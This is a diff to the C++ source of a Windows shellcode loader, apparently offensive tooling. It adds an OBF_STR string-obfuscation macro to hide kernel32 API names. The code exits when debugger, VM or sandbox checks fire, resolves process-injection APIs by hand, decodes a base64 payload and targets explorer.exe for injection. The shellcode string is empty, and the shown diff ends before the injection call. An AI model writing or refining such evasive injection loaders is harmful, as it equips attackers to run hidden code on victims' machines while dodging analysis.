@@ -8,7 +8,8 @@
 #include <winternl.h>
 #include <tlhelp32.h>
 #include <cwchar>
-#include <iphlpapi.h> 
+#include <iphlpapi.h>
+#include "obf.h"
 #include "anti_debug.h"
 #include "anti_sandbox.h"
 #include "anti_vm.h"
@@ -141,7 +142,7 @@ int main() {
 	if (CheckForDebugger() || AntiVM::isVM() || AntiSandbox::check_cpuid() || AntiSandbox::check_timing() || AntiSandbox::check_ram() || AntiSandbox::check_mac_address() || AntiSandbox::check_hardware_names() || AntiSandbox::check_linux_artifacts() || AntiSandbox::check_registry_keys() || AntiSandbox::check_vm_files() || AntiSandbox::check_running_processes()) {{
         return 1;
     }}
-	
+
     HMODULE h_kernel32;
     std::string encoded_shellcode;
     std::string decoded_shellcode;
@@ -150,33 +151,24 @@ int main() {
     LPVOID remote_mem;
     HANDLE h_thread;
 
-    wchar_t kernel32_dll_wstr[] = {L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0};
-    char create_toolhelp_str[] = {'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't', 0};
-    char process32_first_str[] = {'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'F', 'i', 'r', 's', 't', 0};
-    char process32_next_str[] = {'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'N', 'e', 'x', 't', 0};
-    char open_process_str[] = {'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0};
-    char virtual_alloc_ex_str[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', 0};
-    char write_process_mem_str[] = {'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 0};
-    char create_remote_thread_str[] = {'C', 'r', 'e', 'a', 't', 'e', 'R', 'e', 'm', 'o', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0};
-    char close_handle_str[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
-    char virtual_free_ex_str[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 'E', 'x', 0};
-    char explorer_exe_str[] = {'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0};
+    std::string kernel32_dll_str = OBF_STR("kernel32.dll");
+    std::wstring kernel32_dll_wstr(kernel32_dll_str.begin(), kernel32_dll_str.end());
 
-    h_kernel32 = get_module_handle_manual(kernel32_dll_wstr);
-    CreateToolhelp32Snapshot_ptr = (pCreateToolhelp32Snapshot)get_proc_address_manual(h_kernel32, create_toolhelp_str);
-    Process32First_ptr = (pProcess32First)get_proc_address_manual(h_kernel32, process32_first_str);
-    Process32Next_ptr = (pProcess32Next)get_proc_address_manual(h_kernel32, process32_next_str);
-    OpenProcess_ptr = (pOpenProcess)get_proc_address_manual(h_kernel32, open_process_str);
-    VirtualAllocEx_ptr = (pVirtualAllocEx)get_proc_address_manual(h_kernel32, virtual_alloc_ex_str);
-    WriteProcessMemory_ptr = (pWriteProcessMemory)get_proc_address_manual(h_kernel32, write_process_mem_str);
-    CreateRemoteThread_ptr = (pCreateRemoteThread)get_proc_address_manual(h_kernel32, create_remote_thread_str);
-    CloseHandle_ptr = (pCloseHandle)get_proc_address_manual(h_kernel32, close_handle_str);
-    VirtualFreeEx_ptr = (pVirtualFreeEx)get_proc_address_manual(h_kernel32, virtual_free_ex_str);
+    h_kernel32 = get_module_handle_manual(kernel32_dll_wstr.c_str());
+    CreateToolhelp32Snapshot_ptr = (pCreateToolhelp32Snapshot)get_proc_address_manual(h_kernel32, OBF_STR("CreateToolhelp32Snapshot").c_str());
+    Process32First_ptr = (pProcess32First)get_proc_address_manual(h_kernel32, OBF_STR("Process32First").c_str());
+    Process32Next_ptr = (pProcess32Next)get_proc_address_manual(h_kernel32, OBF_STR("Process32Next").c_str());
+    OpenProcess_ptr = (pOpenProcess)get_proc_address_manual(h_kernel32, OBF_STR("OpenProcess").c_str());
+    VirtualAllocEx_ptr = (pVirtualAllocEx)get_proc_address_manual(h_kernel32, OBF_STR("VirtualAllocEx").c_str());
+    WriteProcessMemory_ptr = (pWriteProcessMemory)get_proc_address_manual(h_kernel32, OBF_STR("WriteProcessMemory").c_str());
+    CreateRemoteThread_ptr = (pCreateRemoteThread)get_proc_address_manual(h_kernel32, OBF_STR("CreateRemoteThread").c_str());
+    CloseHandle_ptr = (pCloseHandle)get_proc_address_manual(h_kernel32, OBF_STR("CloseHandle").c_str());
+    VirtualFreeEx_ptr = (pVirtualFreeEx)get_proc_address_manual(h_kernel32, OBF_STR("VirtualFreeEx").c_str());
 
-    std::string en_sh = "";
+    std::string en_sh = OBF_STR("");
 
     std::string dshell = base64_decode(en_sh);
-    proc_id = get_proc_id(explorer_exe_str);
+    proc_id = get_proc_id(OBF_STR("explorer.exe").c_str());
     if (proc_id == 0) {
         return 1;
     }
